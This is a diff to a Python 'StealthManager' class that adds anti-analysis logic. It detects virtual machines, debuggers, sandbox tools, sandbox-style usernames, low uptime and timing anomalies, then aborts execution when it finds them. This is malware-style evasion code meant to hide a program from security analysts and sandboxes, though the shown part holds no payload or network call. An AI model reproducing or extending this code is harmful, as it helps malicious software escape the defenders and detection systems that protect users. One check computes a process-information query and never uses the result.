@@ -100,133 +100,233 @@ class StealthManager:
             if vm_indicators:
                 indicators.extend(vm_indicators)
             
-            debug_indicators = self._check_debug_environment()
-            if debug_indicators:
-                indicators.extend(debug_indicators)
+            debugger_indicators = self._check_debugger_presence()
+            if debugger_indicators:
+                indicators.extend(debugger_indicators)
             
-            resource_indicators = self._check_system_resources()
-            if resource_indicators:
-                indicators.extend(resource_indicators)
+            sandbox_indicators = self._check_sandbox_artifacts()
+            if sandbox_indicators:
+                indicators.extend(sandbox_indicators)
                 
+            timing_indicators = self._check_timing_attacks()
+            if timing_indicators:
+                indicators.extend(timing_indicators)
+                
+            return indicators
+            
         except Exception as e:
             if DEBUG_MODE:
-                logging.error(f"Analysis environment detection failed: {e}")
-        
-        return indicators
+                logging.error(f"Environment detection failed: {e}")
+            return []
     
     def _check_vm_artifacts(self):
         """Check for virtual machine artifacts"""
-        indicators = []
+        artifacts = []
+        
+        if self.is_windows:
+            try:
+                import wmi
+                c = wmi.WMI()
+                
+                # Check BIOS information
+                for bios in c.Win32_BIOS():
+                    if any(keyword in bios.SerialNumber.lower() for keyword in ['vmware', 'virtualbox', 'qemu', 'xen']):
+                        artifacts.append(f"VM BIOS Serial: {bios.SerialNumber}")
+                
+                # Check MAC address prefixes
+                for nic in c.Win32_NetworkAdapterConfiguration():
+                    if nic.MACAddress:
+                        mac = nic.MACAddress.lower()
+                        vm_mac_prefixes = ['00:0c:29', '00:1c:14', '00:50:56', '08:00:27', '52:54:00']
+                        if any(mac.startswith(prefix) for prefix in vm_mac_prefixes):
+                            artifacts.append(f"VM MAC Address: {nic.MACAddress}")
+                
+                # Check processes
+                vm_processes = ['vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe', 'vboxservice.exe', 'vboxtray.exe']
+                for process in c.Win32_Process():
+                    if process.Name.lower() in vm_processes:
+                        artifacts.append(f"VM Process: {process.Name}")
+                        
+            except ImportError:
+                # Fallback WMI-less checks
+                artifacts.extend(self._check_vm_artifacts_fallback())
+        
+        return artifacts
+    
+    def _check_vm_artifacts_fallback(self):
+        """Fallback VM detection without WMI"""
+        artifacts = []
         
         try:
-            import psutil
             import subprocess
             
-            vm_processes = [
-                'vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe',
-                'vboxservice.exe', 'vboxtray.exe', 'xenservice.exe',
-                'qemu-ga.exe', 'prl_cc.exe', 'prl_tools.exe'
+            # Check common VM registry keys
+            vm_registry_paths = [
+                r"SOFTWARE\Oracle\VirtualBox",
+                r"SOFTWARE\VMware, Inc.\VMware Tools",
+                r"SYSTEM\CurrentControlSet\Services\VBoxService",
+                r"SYSTEM\CurrentControlSet\Services\VMTools"
             ]
             
-            for proc in psutil.process_iter(['name']):
-                if proc.info['name'] and proc.info['name'].lower() in vm_processes:
-                    indicators.append(f"VM process detected: {proc.info['name']}")
-            
-            if self.is_windows:
-                vm_registry_keys = [
-                    r'HKEY_LOCAL_MACHINE\SOFTWARE\VMware, Inc.\VMware Tools',
-                    r'HKEY_LOCAL_MACHINE\SOFTWARE\Oracle\VirtualBox Guest Additions',
-                    r'HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\VBoxGuest'
-                ]
-                
-                for key in vm_registry_keys:
+            if sys.platform == "win32":
+                import winreg
+                for path in vm_registry_paths:
                     try:
-                        result = subprocess.run([
-                            'reg', 'query', key
-                        ], capture_output=True, text=True)
-                        
-                        if result.returncode == 0:
-                            indicators.append(f"VM registry key found: {key}")
-                    except:
+                        winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
+                        artifacts.append(f"VM Registry Key: {path}")
+                    except FileNotFoundError:
                         continue
                         
-        except Exception as e:
-            if DEBUG_MODE:
-                logging.error(f"VM artifact check failed: {e}")
-        
-        return indicators
+        except Exception:
+            pass
+            
+        return artifacts
     
-    def _check_debug_environment(self):
-        indicators = []
+    def _check_debugger_presence(self):
+        """Check for debugger presence"""
+        debugger_indicators = []
+        
+        if self.is_windows:
+            try:
+                import ctypes
+                from ctypes import wintypes
+                
+                # Check IsDebuggerPresent
+                is_debugger_present = ctypes.windll.kernel32.IsDebuggerPresent()
+                if is_debugger_present:
+                    debugger_indicators.append("Debugger detected via IsDebuggerPresent")
+                
+                # Check Remote Debugger Present
+                is_remote_debugger_present = ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
+                    ctypes.windll.kernel32.GetCurrentProcess(), 
+                    ctypes.byref(ctypes.c_bool(False))
+                )
+                if is_remote_debugger_present:
+                    debugger_indicators.append("Remote debugger detected")
+                
+                # Check NtGlobalFlag
+                peb = ctypes.windll.ntdll.NtQueryInformationProcess(
+                    ctypes.windll.kernel32.GetCurrentProcess(),
+                    0,  # ProcessBasicInformation
+                    ctypes.byref(ctypes.c_ulong()),
+                    ctypes.sizeof(ctypes.c_ulong()),
+                    ctypes.byref(ctypes.c_ulong())
+                )
+                
+            except Exception:
+                pass
+        
+        return debugger_indicators
+    
+    def _check_sandbox_artifacts(self):
+        """Check for sandbox environment artifacts"""
+        sandbox_indicators = []
         
         try:
-            import psutil
-            
-            # Common analysis tools
-            analysis_tools = [
-                'ollydbg.exe', 'x64dbg.exe', 'windbg.exe', 'ida.exe',
-                'ida64.exe', 'idaq.exe', 'idaq64.exe', 'idaw.exe',
-                'scylla.exe', 'protection_id.exe', 'lordpe.exe',
-                'importrec.exe', 'wireshark.exe', 'fiddler.exe',
-                'procmon.exe', 'procexp.exe', 'regmon.exe',
-                'filemon.exe', 'apimonitor.exe'
+            # Check for common sandbox tools
+            sandbox_processes = [
+                'wireshark.exe', 'fiddler.exe', 'procmon.exe', 'procexp.exe',
+                'ollydbg.exe', 'x64dbg.exe', 'ida.exe', 'ida64.exe',
+                'vboxservice.exe', 'vboxtray.exe', 'vmtoolsd.exe'
             ]
             
-            for proc in psutil.process_iter(['name']):
-                if proc.info['name'] and proc.info['name'].lower() in analysis_tools:
-                    indicators.append(f"Analysis tool detected: {proc.info['name']}")
+            if self.is_windows:
+                import subprocess
+                result = subprocess.run(['tasklist'], capture_output=True, text=True)
+                for process in sandbox_processes:
+                    if process.lower() in result.stdout.lower():
+                        sandbox_indicators.append(f"Sandbox tool detected: {process}")
+            
+            # Check for typical sandbox usernames
+            import getpass
+            current_user = getpass.getuser().lower()
+            sandbox_users = ['sandbox', 'malware', 'test', 'virus', 'sample', 'honeypot']
+            if any(sandbox_user in current_user for sandbox_user in sandbox_users):
+                sandbox_indicators.append(f"Suspicious username: {current_user}")
+                
+            # Check system uptime (sandboxes often have low uptime)
+            if self.is_windows:
+                try:
+                    import ctypes
+                    kernel32 = ctypes.windll.kernel32
+                    uptime = kernel32.GetTickCount64() / 1000 / 60  # Convert to minutes
+                    if uptime < 30:  # Less than 30 minutes
+                        sandbox_indicators.append(f"Low system uptime: {uptime:.1f} minutes")
+                except Exception:
+                    pass
                     
-        except Exception as e:
-            if DEBUG_MODE:
-                logging.error(f"Debug environment check failed: {e}")
+        except Exception:
+            pass
         
-        return indicators
+        return sandbox_indicators
     
-    def _check_system_resources(self):
-        """Check system resources for VM indicators"""
-        indicators = []
+    def _check_timing_attacks(self):
+        timing_indicators = []
         
         try:
-            import psutil
+            import time
             
-            ram_gb = psutil.virtual_memory().total / (1024**3)
-            if ram_gb < 2:
-                indicators.append(f"Low RAM detected: {ram_gb:.1f}GB")
+            # CPU timing check
+            start_time = time.perf_counter()
+            result = sum(i * i for i in range(1000))
+            end_time = time.perf_counter()
             
-            cpu_count = psutil.cpu_count()
-            if cpu_count <= 2:
-                indicators.append(f"Low CPU count: {cpu_count}")
+            execution_time = end_time - start_time
             
-            # Check disk size (VMs often have small disks)
-            disk_usage = psutil.disk_usage('/')
-            disk_gb = disk_usage.total / (1024**3)
-            if disk_gb < 50:
-                indicators.append(f"Small disk detected: {disk_gb:.1f}GB")
+            if execution_time > 0.1:  # 100ms threshold
+                timing_indicators.append(f"Slow execution detected: {execution_time:.4f}s")
+            
+            # Sleep timing check 
+            sleep_duration = 0.1
+            start_time = time.perf_counter()
+            time.sleep(sleep_duration)
+            end_time = time.perf_counter()
+            
+            actual_sleep = end_time - start_time
+            if actual_sleep < sleep_duration * 0.9:  # Sleep was skipped/shortened
+                timing_indicators.append(f"Sleep timing anomaly: {actual_sleep:.4f}s vs {sleep_duration}s")
                 
-        except Exception as e:
-            if DEBUG_MODE:
-                logging.error(f"System resource check failed: {e}")
+        except Exception:
+            pass
         
-        return indicators
+        return timing_indicators
     
     def safe_execute(self, func, *args, **kwargs):
+        """Safely execute function with anti-analysis protection"""
         try:
+            # Add random delays to confuse timing analysis
+            self.add_jitter(0.01, 0.05)
+            
+            # Check for analysis environment before execution
+            if self.should_abort_execution():
+                return None
+                
             return func(*args, **kwargs)
-        except Exception as e:
-            if DEBUG_MODE:
-                logging.error(f"Error in {func.__name__}: {e}")
+            
+        except Exception:
             return None
     
     def should_abort_execution(self):
-        analysis_indicators = self.detect_analysis_environment()
-        
-        # Abort if too many indicators are present
-        if len(analysis_indicators) >= 3:
-            if DEBUG_MODE:
-                logging.warning(f"Analysis environment detected: {analysis_indicators}")
-            return True
-        
-        return False
+        """Determine if execution should be aborted due to analysis environment"""
+        try:
+            indicators = self.detect_analysis_environment()
+            
+            # Define risk thresholds
+            risk_score = len(indicators)
+            high_risk_indicators = ['Debugger detected', 'Remote debugger detected']
+            
+            # Abort if any high-risk indicators are present
+            if any(indicator in ' '.join(indicators) for indicator in high_risk_indicators):
+                return True
+            
+            # Abort if too many indicators are present
+            if risk_score >= 3:
+                return True
+                
+            return False
+            
+        except Exception:
+            return False
 
 # Global stealth manager instance
 stealth_manager = StealthManager()
